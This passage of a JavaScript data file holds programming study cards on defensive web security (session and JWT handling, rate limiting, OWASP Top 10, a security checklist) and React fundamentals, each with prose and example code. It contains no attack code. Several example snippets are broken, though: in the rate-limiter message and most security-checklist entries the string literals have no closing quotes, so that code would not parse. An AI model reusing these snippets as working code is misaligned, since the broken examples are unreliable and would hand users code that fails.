prevents session fixation attacks — where an attacker sets a known session ID before the user authenticates. After login, generate a new session ID and migrate the session data. For stateless authentication (JWT), the server does not store session data — the token contains all claims and is validated by signature. JWT best practices: use short expiration (15 minutes), implement refresh tokens for long-lived sessions, store tokens in HttpOnly cookies (not localStorage — XSS can steal them), validate tokens on every request, and revoke tokens on logout (use a token blocklist). Common mistakes include: not setting cookie security flags, not implementing session expiration, storing JWT in localStorage, not regenerating session IDs on privilege change, and not handling session invalidation on logout properly',
    example: `// Secure session config (express-session)
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,     // HTTPS only
    httpOnly: true,   // No JS access
    sameSite: 'lax', // CSRF protection
    maxAge: 3600000   // 1 hour
  }
}));

// Regenerate session on login
app.post('/login', (req, res) => {
  req.session.regenerate((err) => {
    req.session.userId = user.id;
    res.redirect('/dashboard');
  });
});

// JWT best practices
// Store in httpOnly cookie, NOT localStorage
// Use short expiry (15 min) + refresh token`
  },
  {
    title: 'Rate Limiting & Brute Force Protection',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Preventing abuse by limiting request frequency.',
    content: 'Rate limiting restricts how many requests a client can make in a given time window. Prevents brute force attacks, API abuse, and DDoS. Use sliding window or token bucket algorithms. Implement progressive delays for failed attempts.\n\nRate limiting is a security and performance technique that restricts how many requests a client can make to a server within a given time window. It protects against brute force attacks (trying many passwords or tokens), credential stuffing (using stolen credentials), API abuse (excessive API calls that degrade service), and distributed denial of service (DDoS) attacks. Rate limiting is implemented at various levels: application (Express middleware), reverse proxy (nginx, Cloudflare), API gateway (AWS API Gateway), and load balancer. The choice depends on your architecture and where you want to enforce limits.\n\nRate limiting algorithms include: Fixed window (count requests in a fixed time window — simple but allows bursts at window boundaries), Sliding window (rolling window — smoother limiting), Token bucket (allows controlled bursts — tokens are added at a fixed rate and consumed by requests), and Leaky bucket (processes requests at a constant rate — excess requests are queued or dropped). The sliding window algorithm is the most common — it tracks requests in a rolling time window using sorted sets in Redis (timestamp as score, request ID as member). This provides smooth rate limiting without the burst problem of fixed windows.\n\nImplementation with Redis: maintain a sorted set per client (keyed by IP, API key, or user ID), add the current timestamp for each request, remove timestamps older than the window, and count remaining entries. Return 429 Too Many Requests with Retry-After header when the limit is exceeded. Progressive delay for failed login attempts adds increasing delays (1 second, 2 seconds, 5 seconds, 10 seconds) after each failed attempt, significantly slowing brute force attacks. IP-based blocking can be added after a threshold of failed attempts. Common mistakes include: rate limiting by IP only (attackers can use multiple IPs), not rate limiting authentication endpoints (most critical to protect), not implementing progressive delays, returning generic error messages (don\'t reveal whether a username exists), and not monitoring rate limit violations for security alerts. Rate limiting should be combined with account lockout, CAPTCHA, and monitoring for comprehensive protection',
    example: `// express-rate-limit
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  message: 'Too many attempts, try again later
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/login', loginLimiter);

// Progressive delay
const delays = [0, 1000, 2000, 5000, 10000];
app.use('/login', (req, res, next) => {
  const attempts = getFailedAttempts(req.ip);
  const delay = delays[Math.min(attempts, delays.length - 1)];
  setTimeout(next, delay);
});

// IP-based blocking
if (failedAttempts > 10) blockIP(req.ip, 3600);`
  },
  {
    title: 'OWASP Top 10',
    category: 'Cybersecurity',
    subcategory: 'Overview',
    description: 'The most critical web application security risks (2021 edition).',
    content: 'OWASP Top 10: (1) Broken Access Control, (2) Cryptographic Failures, (3) Injection, (4) Insecure Design, (5) Security Misconfiguration, (6) Vulnerable Components, (7) Auth Failures, (8) Data Integrity Failures, (9) Logging Failures, (10) SSRF. Understanding these categories helps prioritize security efforts.\n\nThe OWASP Top 10 is a regularly updated list of the most critical web application security risks, published by the Open Web Application Security Project. It is the industry standard awareness document for web application security and serves as a starting point for organizations to improve their security posture. The 2021 edition reflects the evolving threat landscape and includes new categories that address modern application architectures. Understanding these risks helps developers prioritize security efforts and implement appropriate controls.\n\nThe 2021 categories: (1) Broken Access Control — users acting outside intended permissions (most common vulnerability). Prevent: deny by default, enforce server-side authorization, use RBAC. (2) Cryptographic Failures — exposure of sensitive data due to weak encryption (replaced "Sensitive Data Exposure"). Prevent: encrypt data at rest and in transit, use strong algorithms. (3) Injection — SQL, NoSQL, OS command injection via untrusted input. Prevent: parameterized queries, input validation. (4) Insecure Design — architectural flaws (new category). Prevent: threat modeling, secure design patterns, reference architectures. (5) Security Misconfiguration — default configs, unnecessary features, detailed error messages. Prevent: hardening, minimal attack surface, automated configuration. (6) Vulnerable and Outdated Components — using libraries with known vulnerabilities. Prevent: dependency scanning, timely updates. (7) Identification and Authentication Failures — weak authentication, credential stuffing. Prevent: MFA, secure session management, password policies. (8) Software and Data Integrity Failures — insecure CI/CD, auto-updates without verification (new category). Prevent: code signing, integrity verification. (9) Security Logging and Monitoring Failures — insufficient logging, detection, and response. Prevent: comprehensive logging, monitoring, incident response. (10) Server-Side Request Forgery (SSRF) — server making requests to unintended locations (new category). Prevent: validate URLs, use allowlists, segment networks.\n\nApplying the OWASP Top 10: use it as a checklist for security reviews, implement automated security testing (SAST, DAST, SCA), conduct regular penetration testing, train developers on secure coding, and integrate security into the SDLC (Software Development Life Cycle). The OWASP Application Security Verification Standard (ASVS) provides more detailed requirements for different assurance levels. Common mistakes include: treating OWASP Top 10 as comprehensive (it covers the top 10, not all risks), not implementing basic controls, assuming framework security is sufficient, and not testing for these vulnerabilities regularly',
    example: `// 1. Broken Access Control
// Ensure users can only access their own data
if (resource.userId !== currentUser.id) return 403;

// 3. Injection
// Use parameterized queries, never concatenate SQL

// 5. Security Misconfiguration
// Remove default credentials, disable debug mode in production

// 6. Vulnerable Components
// npm audit, keep dependencies updated

// 7. Auth Failures
// Implement MFA, use secure password hashing

// 9. Logging & Monitoring
logger.info('Login attempt', { userId, ip, success });
logger.warn('Failed login', { userId, ip, attempt: count });`
  },
  {
    title: 'Web Security Best Practices',
    category: 'Cybersecurity',
    subcategory: 'Overview',
    description: 'Comprehensive security checklist for modern web applications.',
    content: 'Security is a layered approach. Key practices: validate all input, sanitize output, use HTTPS everywhere, implement CSP, use security headers, rate limit endpoints, log security events, keep dependencies updated, conduct security audits, and train developers on secure coding.\n\nWeb security is not achieved through a single control but through defense-in-depth — multiple layers of security controls that together provide comprehensive protection. No single security measure is sufficient; an attacker who bypasses one layer should encounter another. This layered approach means that even if one control fails, others continue to protect the application. Security should be integrated into every phase of development: design (threat modeling, secure architecture), implementation (secure coding practices, code review), testing (security testing, penetration testing), deployment (hardening, configuration), and operations (monitoring, incident response).\n\nEssential security practices organized by layer: Input validation — validate all input on the server using allowlists. Output encoding — encode output for the appropriate context (HTML, JavaScript, URL, CSS). Authentication — use bcrypt/Argon2 for passwords, implement MFA, use secure session management. Authorization — check permissions on every request, deny by default, use RBAC or ABAC. Cryptography — encrypt sensitive data at rest and in transit, use strong algorithms, manage keys securely. Error handling — do not expose sensitive information in error messages, use generic messages for authentication errors. Logging — log security events (login attempts, access control failures, input validation failures), protect log data, do not log sensitive information. Dependencies — regularly update dependencies, use automated scanning (npm audit, Snyk), pin versions in production.\n\nInfrastructure security: use security headers (CSP, HSTS, X-Content-Type-Options), enable HTTPS everywhere, configure firewalls and WAFs, segment networks, use least-privilege database accounts, and implement rate limiting. Development practices: conduct code reviews with security focus, use static analysis tools (ESLint security plugins, SonarQube), perform dynamic testing (OWASP ZAP, Burp Suite), and train developers on secure coding. Incident response: have a plan for security incidents, practice it, and learn from incidents. Common mistakes include: treating security as a one-time effort, not testing for vulnerabilities, assuming frameworks handle everything, not monitoring for attacks, and not having an incident response plan. Security is an ongoing process, not a destination — the threat landscape evolves, and your defenses must evolve with it',
    example: `// Security checklist
const securityChecklist = {
  authentication: [
    'Use bcrypt/argon2 for passwords
    'Implement MFA
    'Account lockout after failed attempts
    'Secure session management'
  ],
  authorization: [
    'Check permissions on every request
    'Use RBAC or ABAC
    'Deny by default'
  ],
  dataProtection: [
    'Encrypt data at rest and in transit
    'Minimize data collection
    'Implement data retention policies'
  ],
  infrastructure: [
    'Use security headers
    'Enable CSP
    'Regular dependency audits
    'Automated security testing'
  ]
};

// Run npm audit regularly
// Use Snyk or similar for vulnerability scanning
// Implement CI/CD security checks`
  },

  // ═══════════════════════════════════════════
  // REACT
  // ═══════════════════════════════════════════
  {
    title: 'Components & JSX',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Building blocks of React UIs — reusable functions that return JSX.',
    content: 'Components are JavaScript functions that return JSX (a syntax extension resembling HTML). JSX compiles to React.createElement() calls. Components can be functional (modern) or class-based (legacy). Each component should do one thing well. Props flow down, events flow up.\n\nReact components are the building blocks of React applications — reusable, composable pieces of UI that accept inputs (props) and return React elements describing what should appear on screen. JSX is a syntax extension that looks like HTML but compiles to JavaScript function calls (React.createElement()). Each JSX element becomes a nested object (React element) that React uses to build and update the virtual DOM. Components should be small, focused, and reusable — following the Single Responsibility Principle. A component that renders a button, a component that renders a card, and a component that renders a form are better than one component that does everything.\n\nFunctional components are the modern standard — they are plain JavaScript functions that accept a props object and return JSX. They are simpler, easier to test, and work seamlessly with hooks. Class components (extending React.Component) are the legacy approach — they use this.state and lifecycle methods (componentDidMount, render, etc.). While still supported, class components are rarely used in new projects. Component composition is the key to building complex UIs — small components are combined into larger ones, which are combined into pages. This creates a component tree that mirrors the UI structure.\n\nThe data flow in React is unidirectional: props flow down from parent to child, and events flow up from child to parent via callback functions. This "lifting state up" pattern means that shared state lives in the closest common ancestor and is passed down via props. This makes data flow predictable and debuggable. Components should be pure functions of their props — given the same props, they should always render the same output. This purity enables React\'s optimization strategies (memoization, lazy loading). Common patterns include: presentational components (UI only, no state), container components (state and logic), and compound components (implicit state sharing via context). Common mistakes include: putting too much logic in components, not extracting reusable components, mutating props, and not following the single responsibility principle',
    example: `// Functional component
function Greeting({ name, age }) {
  return (
    <div className="greeting">
      <h1>Hello, {name}!</h1>
      <p>You are {age} years old.</p>
    </div>
  );
}

// Arrow function variant
const Greeting = ({ name, age }) => (
  <div>
    <h1>Hello, {name}!</h1>
    <p>Age: {age}</p>
  </div>
);

// Usage
<Greeting name="Alice" age={25} />

// Conditional rendering
const Dashboard = ({ isLoggedIn }) => (
  isLoggedIn ? <MainContent /> : <LoginPrompt />
);`
  },
  {
    title: 'Props & State',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Data flow: props pass data down, state manages internal component data.',
    content: 'Props are read-only inputs passed from parent to child. State is internal, mutable data managed by useState. State changes trigger re-renders. Never modify props directly. State updates are batched and asynchronous. Use functional updates for state that depends on previous state.\n\nProps (short for properties) are the mechanism for passing data from parent components to child components. They are read-only — a component must never modify its own props. Props can be any JavaScript value: strings, numbers, booleans, objects, arrays, functions, and even other React elements. Destructuring props in the function signature (function MyComponent({ name, age })) makes the component\'s interface explicit. Default props can be set with destructuring defaults ({ size = "medium" }) or defaultProps. Children (the content between opening and closing tags) is a special prop passed automatically.\n\nState is a component\'s internal, mutable data that triggers re-renders when changed. useState is the primary hook for managing state: const [count, setCount] = useState(0). Calling setCount triggers a re-render with the new value. State updates are batched — multiple setState calls in the same event handler are batched into a single re-render for performance. State is asynchronous — you cannot read the new state immediately after calling the setter because the re-render has not happened yet. Use functional updates (setCount(prev => prev + 1)) when the new state depends on the previous state — this ensures you are working with the latest value, not a stale closure.\n\nDerived state is data that can be computed from existing props and state — it should not be stored in state. For example, filteredItems = items.filter(i => i.active) should be computed during render, not stored in state. This avoids synchronization bugs where the derived value and source data get out of sync. State should be as close to where it is used as possible — if only one component needs the state, keep it there. If multiple components need it, lift it to the nearest common ancestor. Common mistakes include: storing derived state (causes sync bugs), mutating state directly (does not trigger re-renders — always use the setter), storing redundant state (values that can be computed from other state/props), and not using functional updates when state depends on previous state. Understanding the one-way data flow (props down, events up) is fundamental to React\'s architecture and makes applications predictable and debuggable',
    example: `import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>+1</button>
      <button onClick={() => setCount(c => c + 1)}>+1 (safe)</button>
    </div>
  );
}

// Lifting state up
function Parent() {
  const [selected, setSelected] = useState(null);
  return (
    <Child
      value={selected}
      onChange={setSelected}
    />
  );
}

// Derived state (compute, don't store)
function List({ items }) {
  const filtered = items.filter(i => i.active); // don't store in state
  return <ul>{filtered.map(i => <li key={i.id}>{i.name}</li>)}</ul>;
}`
  },
  {
    title: 'useEffect & Lifecycle',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Side effects: data fetching, subscriptions, timers, and DOM manipulation.',
    content: 'useEffect runs after render: useEffect(callback, deps). Empty deps [] = once on mount. No deps = every render. Return a cleanup function for subscriptions/timers. Common patterns: fetch on mount, subscribe to events, sync with external systems. Avoid infinite loops by managing dependencies correctly.\n\nuseEffect is the primary hook for side effects in React — operations that interact with the outside world: data fetching, DOM manipulation, subscriptions, timers, and logging. It runs after the browser paints the screen, so it does not block rendering. The dependency array controls when the effect re-runs: empty array [] means run once on mount, no array means run on every render, [dep1, dep2] means run when any dependency changes. The cleanup function (returned from the effect) runs before the effect re-runs and when the component unmounts — it is used to clean up subscriptions, timers, and event listeners to prevent memory leaks.\n\nData fetching patterns: the most common pattern is fetching data on mount or when a dependency changes. Use a cleanup flag to prevent setting state on unmounted components (the cancelled pattern). The useEffect + fetch pattern is straightforward but has limitations — it does not handle caching, deduplication, or race conditions well. Libraries like SWR and React Query handle these concerns. For simple cases, the pattern works: useEffect(() => { let cancelled = false; fetch(url).then(res => res.json()).then(data => { if (!cancelled) setData(data); }); return () => { cancelled = true; }; }, [url]).\n\nCommon pitfalls include: missing dependencies (causes stale closures), including too many dependencies (causes unnecessary re-runs), not providing a cleanup function (causes memory leaks), and using useEffect for derived state (should be computed during render). The dependency array must include every external value the effect uses — ESLint\'s exhaustive-deps rule enforces this. Infinite loops occur when the effect modifies a state that is in its dependency array (useEffect sets state → state changes → effect re-runs → sets state again → infinite loop). To fix, remove the state from dependencies or restructure the logic. Understanding the difference between effects (side effects) and event handlers (user interactions) is important — effects run on render, event handlers run on user action. This distinction affects when code executes and what dependencies are needed',
    example: `import { useState, useEffect } from 'react';

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);

  // Fetch on mount and when userId changes
  useEffect(() => {
    let cancelled = false;
    fetchUser(userId).then(data => {
      if (!cancelled) setUser(data);
    });
    return () => { cancelled = true; }; // cleanup
  }, [userId]);

  // Subscribe to event
  useEffect(() => {
    const handler = (e) => console.log('Resize', e);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);

  // Timer
  useEffect(() => {
    const id = setInterval(() => setCount(c => c + 1), 1000);
    return () => clearInterval(id);
  }, []);

  if (!user) return <Spinner />;
  return <div>{user.name}</div>;
}`
  },
  {
    title: 'useContext',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Sharing data across the component tree without prop drilling.',
    content: 'useContext provides a way to pass data through the component tree without manually passing props at every level. Create a context with createContext, provide it with a Provider, consume it with useContext. Best for theme, auth, locale, and other global state. Don\'t overuse it — prop drilling is fine for 2-3 levels.\n\nuseContext solves the "prop drilling" problem — passing props through multiple intermediate components that do not use them, just to reach a deeply nested component. Without context, if a ThemeContext value needs to reach a Button component five levels deep, every component in between must accept and forward the prop. Context allows you to create a Provider at a high level and consume the value at any depth without intermediate forwarding. Create context with createContext(defaultValue), provide it with <Context.Provider value={...}>, and consume it with useContext(Context) in any descendant.\n\nContext is best suited for data that is truly global and changes infrequently: theme (dark/light mode), authentication state (current user, login status), locale/language preferences, and feature flags. It is NOT a replacement for all state management — for frequently changing data, performance-sensitive updates, or complex state logic, dedicated state management (useState, useReducer, Zustand, Jotai) is more appropriate. Context re-renders ALL consumers when the Provider value changes — if you put frequently changing data in context, every consumer re-renders, even if it does not use the changed part of the value.\n\nCommon patterns: splitting context into separate providers for state and dispatch (to avoid unnecessary re-renders), using multiple contexts for different concerns (AuthContext, ThemeContext, LocaleContext), and combining context with useReducer for complex state logic. The Provider value should be memoized to prevent unnecessary re-renders of consumers: const value = useMemo(() => ({ state, dispatch }), [state, dispatch]). Common mistakes include: using context for all state (use useState/useReducer for local state), putting frequently changing data in context (causes performance issues), not providing a meaningful default value, and creating context inside components (context should be created at module level). For performance-sensitive applications, consider state management libraries (Zustand, Jotai, Valtio) that provide fine-grained subscriptions without the re-render overhead of context',
    example: `import { createContext, useContext, useState } from 'react';

const ThemeContext = createContext();

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('dark');
  const toggle = () => setTheme(t => t === 'dark' ? 'light' : 'dark');
  return (
    <ThemeContext.Provider value={{ theme, toggle }}>
      {children}
    </ThemeContext.Provider>
  );
}

function ThemedButton() {
  const { theme, toggle } = useContext(ThemeContext);
  return (
    <button onClick={toggle}>
      Current: {theme}
    </button>
  );
}

// Usage (wrap at top level)
<ThemeProvider>
  <App />
</ThemeProvider>`
  },
  {
    title: 'useRef',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Accessing DOM elements and persisting mutable values without re-renders.',
    content: 'useRef returns a mutable ref object (.current). Common uses: (1) Accessing DOM elements directly, (2) Storing values that don\'t trigger re-renders (previous values, timers, flags). Unlike useState, changing ref.current doesn\'t cause a re-render.\n\nuseRef creates a mutable reference object that persists across renders without triggering re-renders when changed. It serves two primary purposes: accessing DOM elements and storing mutable values that should not cause re-renders. The ref object has a single property — .current — which can hold any value. When used with JSX elements, ref.current is set to the DOM element after mounting. This provides direct access to DOM APIs (focus, scrollIntoView, getBoundingClientRect, addEventListener) that are not available through React\'s declarative model.\n\nFor DOM access: const inputRef = useRef(null); return <input ref={inputRef} />. After mounting, inputRef.current references the actual DOM input element. This is useful for programmatic focus (inputRef.current.focus()), measuring element dimensions, integrating with third-party DOM libraries, and managing scroll position. The ref callback pattern (ref={(el) => ...}) provides more control over when the ref is set and cleared.\n\nFor storing mutable values: useRef is ideal for values that need to persist across renders but should not trigger re-renders when changed. Common examples: storing the previous value of state (for comparison), holding interval/timeout IDs (for cleanup), tracking whether the component has mounted (for avoiding state updates on unmount), and storing any mutable value that should not cause re-renders. Unlike useState, changing ref.current does not schedule a re-render — the update is synchronous and silent. This makes useRef cheaper than useState for values that do not affect the UI. Common mistakes include: using useRef when useState is needed (ref changes do not update the UI), using refs to access child components (use forwardRef or imperative handle instead), and forgetting that ref.current is undefined during the first render. useRef is not a "escape hatch" from React\'s model — it should be used sparingly and only when direct DOM access or non-rendering state is genuinely needed',
    example: `import { useRef, useEffect } from 'react';

function TextInput() {
  const inputRef = useRef(null);

  const focus = () => inputRef.current.focus();

  return (
    <>
      <input ref={inputRef} type="text" />
      <button onClick={focus}>Focus</button>
    </>
  );
}

// Store previous value
function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = useRef(count);

  useEffect(() => {
    prevCount.current = count;
  }, [count]);

  return <p>Now: {count}, Before: {prevCount.current}</p>;
}

// Store interval ID (no re-render)
function Timer() {
  const [time, setTime] = useState(0);
  const intervalRef = useRef(null);

  const start = () => {
    intervalRef.current = setInterval(() => setTime(t => t + 1), 1000);
  };
  const stop = () => clearInterval(intervalRef.current);
}`
  },
  {
    title: 'useMemo & useCallback',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Performance optimization — memoizing values and functions.',
    content: 'useMemo caches a computed value between re-renders (skip expensive recalculations). useCallback caches a function reference (prevent child re-renders). Both depend on dependency arrays. Don\'t premature-optimize — only use when you have measurable performance issues or pass callbacks to memoized children.\n\nuseMemo and useCallback are performance optimization hooks that prevent unnecessary work between re-renders. useMemo caches the result of an expensive computation — if dependencies have not changed, the cached value is returned without recomputing. useCallback caches a function reference — if dependencies have not changed, the same function instance is returned, preventing child components that receive it as a prop from re-rendering. Both take a function/value and a dependency array. When any dependency changes, the cached value is invalidated and recomputed/recreated on the next render.\n\nuseMemo is valuable when: computing derived data from large datasets (filtering, sorting, aggregating), creating expensive objects or arrays that should not be recreated on every render, and stabilizing values passed to memoized children. For example: const filtered = useMemo(() => products.filter(p => p.price > min), [products, min]). Without useMemo, filtering runs on every render — with it, filtering only runs when products or min changes. useMemo also prevents object identity instability: const options = useMemo(() => ({ method: \'POST\', body: JSON.stringify(data) }), [data]) ensures options is the same reference between renders unless data changes.\n\nuseCallback is valuable when: passing callbacks to memoized child components (React.memo), creating stable references for effect dependencies, and avoiding unnecessary re-renders of expensive children. The key insight is that React.memo checks if props changed by reference — a new function created on every render causes the child to re-render even if the function behavior is identical. useCallback prevents this by returning the same function reference across renders. Common mistakes include: premature optimization (use these only when profiling shows a problem), missing dependencies (causes stale closures), and memoizing cheap computations (the overhead of memoization exceeds the computation cost). React Compiler (React 19+) automatically memoizes values and callbacks, reducing the need for manual useMemo/useCallback. Always profile before and after to verify the optimization actually helps',
    example: `import { useMemo, useCallback } from 'react';

function ProductList({ products, filter }) {
  // useMemo — skip expensive filtering
  const filtered = useMemo(() => {
    return products.filter(p => p.price > filter.min);
  }, [products, filter.min]);

  // useCallback — stable function reference
  const handleSelect = useCallback((id) => {
    console.log('Selected:', id);
  }, []);

  return (
    <ul>
      {filtered.map(p => (
        <Product key={p.id} product={p} onSelect={handleSelect} />
      ))}
    </ul>
  );
}

// React.memo + useCallback combo
const Product = React.memo(({ product, onSelect }) => {
  // Only re-renders if product or onSelect changes
  return <li onClick={() => onSelect(product.id)}>{product.name}</li>;
});`
  },
  {
    title: 'Custom Hooks',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Extracting reusable stateful logic into custom functions.',
    content: 'Custom hooks are functions that use other hooks. They let you extract component logic into reusable functions. Naming convention: use + descriptive name. They can return values, functions, or combinations. Same hook in different components maintains separate state.\n\nCustom hooks are the primary mechanism for logic reuse in React. They extract stateful logic from components into reusable functions, enabling multiple components to share behavior without sharing state. A custom hook is any function whose name starts with "use" and that calls other hooks (useState, useEffect, useContext, etc.). The "use" prefix is a convention that tells React\'s linter to enforce hook rules within the function. Custom hooks do not have any special API — they are regular functions that use hooks, but the convention and naming make them recognizable as reusable logic.\n\nCommon custom hooks include: useFetch (data fetching with loading/error states), useLocalStorage (synchronized localStorage state), useDebounce (debounced values), useMediaQuery (responsive breakpoint detection), useClickOutside (detecting clicks outside an element), usePrevious (accessing previous state values), and useInterval (safe interval management). Each of these encapsulates a piece of logic that would otherwise need to be duplicated across components. For example, useLocalStorage synchronizes state with localStorage — when the value changes, it updates localStorage, and when the component mounts, it reads from localStorage. This logic is common but verbose to implement each time.\n\nRules and best practices: always start the name with "use", follow React\'s hook rules (only call at top level, only from React functions), return values and functions that the consuming component needs, and document what the hook does and what it returns. Custom hooks can call other custom hooks — useFetch might use useLocalStorage for caching. Each component using a custom hook maintains independent state — two components using useLocalStorage with the same key will have separate state (the hook runs in each component\'s scope). Common mistakes include: creating hooks for logic that does not use other hooks (just use a utility function), not providing proper TypeScript types, and not handling cleanup in useEffect within custom hooks. Custom hooks are the modern replacement for higher-order components (HOCs) and render props — they are simpler, more composable, and do not add wrapper components to the tree',
    example: `// Custom hook for API calls
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    setLoading(true);
    fetch(url)
      .then(res => res.json())
      .then(data => { setData(data); setLoading(false); })
      .catch(err => { setError(err); setLoading(false); });
  }, [url]);

  return { data, loading, error };
}

// Custom hook for localStorage
function useLocalStorage(key, initial) {
  const [value, setValue] = useState(() => {
    const saved = localStorage.getItem(key);
    return saved ? JSON.parse(saved) : initial;
  });

  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);

  return [value, setValue];
}

// Usage
function App() {
  const { data, loading } = useFetch('/api/users');
  const [theme, setTheme] = useLocalStorage('theme', 'dark');
}`
  },
  {
    title: 'Lists & Keys',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Rendering collections efficiently with stable, unique keys.',
    content: 'Use map() to render arrays. Each element needs a unique key prop (prefer stable IDs over indices). Keys help React identify which items changed, were added, or removed. Bad keys cause rendering bugs and performance issues. Never use Math.random() as keys.\n\nRendering lists in React requires mapping an array of data to an array of React elements using the map() method. Each element in the rendered list must have a unique key prop — a string or number that identifies the element among its siblings. Keys help React\'s reconciliation algorithm determine which items in the old list correspond to items in the new list, enabling efficient updates without re-rendering the entire list. Without keys, or with poor keys, React falls back to re-rendering everything, causing performance issues and potentially breaking component state (form inputs losing focus, animations resetting, animations jumping).\n\nGood keys are unique, stable, and predictable. Use database IDs (user.id, post.id), unique properties (slug, sku), or generated IDs (uuid, nanoid) — never use array indices as keys if the list can be reordered, filtered, or have items added/removed. Index keys work only if the list is static (never changes order or items). Math.random() as keys is always wrong — keys change on every render, forcing React to unmount and remount every item, destroying all component state and defeating any optimization. The key should be on the outermost element returned by map — if map returns a fragment, the key goes on the fragment.\n\nCommon patterns: filtering without losing state (keep the key stable during filter changes), rendering nested lists (keys must be unique within their parent — use compound keys like ${parentId}-${childId}), and conditional rendering within lists (filter before mapping rather than returning null from map). Common mistakes include: not providing keys, using index keys for mutable lists, using Math.random() for keys, using the same key for multiple elements, and putting keys on the wrong element (inside a fragment rather than on the fragment itself). Keys are not accessible as props inside the component — they are a hint to React, not a prop. The warning "Each child in a list should have a unique key prop" should never appear in production code',
    example: `function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          {todo.text}
        </li>
      ))}
    </ul>
  );
}

// ❌ Bad keys
{items.map((item, i) => <li key={i}>...</li>)}  // index
{items.map(item => <li key={Math.random()}>...</li>)}  // random

// ✅ Good keys
{items.map(item => <li key={item.id}>...</li>)}  // stable ID
{items.map(item => <li key={item.slug}>...</li>)}  // unique property

// Filtering without losing state
const [filter, setFilter] = useState('all');
const filtered = todos.filter(t =>
  filter === 'all' ? true : t.done === (filter === 'done')
);`
  },
  {
    title: 'Event Handling',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Handling user interactions with synthetic events.',
    content: 'React wraps native events in SyntheticEvents for cross-browser consistency. Event handlers are camelCase (onClick, onChange). Pass the handler, don\'t call it. Access the event object in the handler. Use event.preventDefault() for form submission. Event delegation happens automatically in React.\n\nReact implements its own event system called SyntheticEvents that wraps native browser events. SyntheticEvents provide a consistent cross-browser interface — they work identically regardless of the browser. React does not attach event handlers to individual DOM elements. Instead, it uses event delegation at the root level (document in React 17, root container in React 18+), listening for events once and routing them to the appropriate component. This is more memory-efficient and enables features like automatic event pooling (in older React versions). The event object passed to handlers is a SyntheticEvent, not a native event — it has the same API (preventDefault, stopPropagation, target, currentTarget) but is a wrapper.\n\nEvent handlers in JSX are camelCase: onClick, onChange, onSubmit, onKeyDown, etc. You pass the handler function reference, not a call: onClick={handleClick} (correct) vs onClick={handleClick()} (incorrect — calls immediately on render). The handler receives the SyntheticEvent as an argument. Common event patterns: preventing default form submission (e.preventDefault()), accessing form values (new FormData(e.target)), stopping event propagation (e.stopPropagation() for preventing event bubbling), and accessing the target element (e.target.value for input changes).\n\nEvent delegation in React means that even though you attach handlers to individual elements in JSX, React optimizes by managing events at the root level. This is transparent to developers — you write handlers as if they are attached to individual elements. The practical implication is that events bubble up through the React tree, not the DOM tree. React\'s onChange on inputs fires on every keystroke (unlike the native change event, which fires on blur). React\'s onChange on radio buttons and checkboxes works differently from native events. Common mistakes include: passing a function call instead of a reference, not preventing default on form submission, using event.stopPropagation() unnecessarily (can break other handlers), and confusing React\'s onChange with the native change event. For complex event handling, consider using event delegation patterns (a single handler on a parent) rather than individual handlers on every child element',
    example: `function Form() {
  const handleSubmit = (e) => {
    e.preventDefault();  // prevent page reload
    const data = new FormData(e.target);
    console.log(data.get('email'));
  };

  const handleChange = (e) => {
    console.log(e.target.name, e.target.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input name="email" onChange={handleChange} />
      <input name="password" type="password" />
      <button type="submit">Submit</button>
    </form>
  );
}

// Event delegation
function List({ items }) {
  const handleClick = (e) => {
    // Single handler for all items
    const id = e.target.dataset.id;
    if (id) console.log('Clicked:', id);
  };

  return (
    <ul onClick={handleClick}>
      {items.map(i => <li key={i.id} data-id={i.id}>{i.name}</li>)}
    </ul>
  );
}`
  },
  {
    title: 'Conditional Rendering',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Showing/hiding UI elements based on state and props.',
    content: 'Multiple approaches: && operator (short-circuit), ternary operator (if/else), early return, if statements before return. Use the approach that reads most clearly. Avoid rendering null with && if the falsy value could be 0.\n\nConditional rendering in React controls what UI is displayed based on conditions (state, props, logic). React supports multiple patterns, and the choice depends on readability, complexity, and the specific condition. The && operator (short-circuit evaluation) is concise for show/hide: {isLoggedIn && <Dashboard />}. If isLoggedIn is true, Dashboard renders. If false, nothing renders (React ignores the false). The ternary operator (condition ? a : b) is for if/else decisions: {isAdmin ? <AdminPanel /> : <UserPanel />}. Early return pattern handles loading/error states: if (loading) return <Spinner />; if (error) return <ErrorMessage />;\n\nA common mistake with && is rendering unexpected values when the left side is 0. Since 0 is falsy in JavaScript, {count && <Badge count={count} /> } renders "0" (the literal number) instead of nothing, because JavaScript evaluates 0 && <Badge> as 0. The fix is to convert to boolean: {count > 0 && <Badge count={count} />}. This is one of the most common React bugs and is easy to miss in testing.\n\nFor complex conditional rendering with multiple branches, using if/else statements before the return statement or a variable assignment pattern is clearest. This avoids deeply nested ternaries that are hard to read: let content; if (loading) content = <Spinner />; else if (error) content = <Error />; else content = <Data />; return <div>{content}</div>. For rendering lists conditionally, filter the array before mapping rather than returning null from the map callback. This avoids wasted renders and key issues. Common mistakes include: deeply nested ternaries (hard to read), forgetting that && renders the left operand if it is a truthy non-boolean (can cause unexpected renders), and 